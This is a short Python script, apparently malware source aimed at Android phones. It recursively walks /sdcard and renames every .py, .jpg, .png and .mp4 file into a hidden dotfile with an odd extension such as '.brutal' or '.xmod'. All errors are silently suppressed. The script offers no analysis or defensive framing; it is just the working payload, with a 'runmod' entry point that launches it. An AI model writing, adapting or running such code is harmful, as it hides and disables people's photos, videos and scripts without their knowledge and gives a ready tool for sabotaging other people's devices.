# --> module
import os

# --> Function listing folder
def folder(p):
	try:
		r = os.listdir(p)

		for x in r:
			P = p + '/' + x
			x = os.path.split(x)[1]

			if '.' in x:
				if x.split('.')[1] in ['mp4','png','jpg','py']:
					set_file(P)
			else:
				folder(P)

	except:
		pass

# --> Function editing file
def set_file(p):
	try:
		P, f = os.path.split(p)
		c    = f.count('.')
		P    = P + '/'

		if c < 2:
			if '.py' in p:
				nf = f"{P}.{f.split('.')[0]}.brutalxid"
				os.rename(p, nf)
			elif '.jpg' in p:
				nf = f"{P}.{f.split('.')[0]}.brutalx"
				os.rename(p, nf)
			elif '.png' in p:
				nf = f"{P}.{f.split('.')[0]}.brutal"
				os.rename(p, nf)
			elif '.mp4' in p:
				nf = f"{P}.{f.split('.')[0]}.xmod"
				os.rename(p, nf)

	except:
		pass
		


def runmod():
	folder('/sdcard')
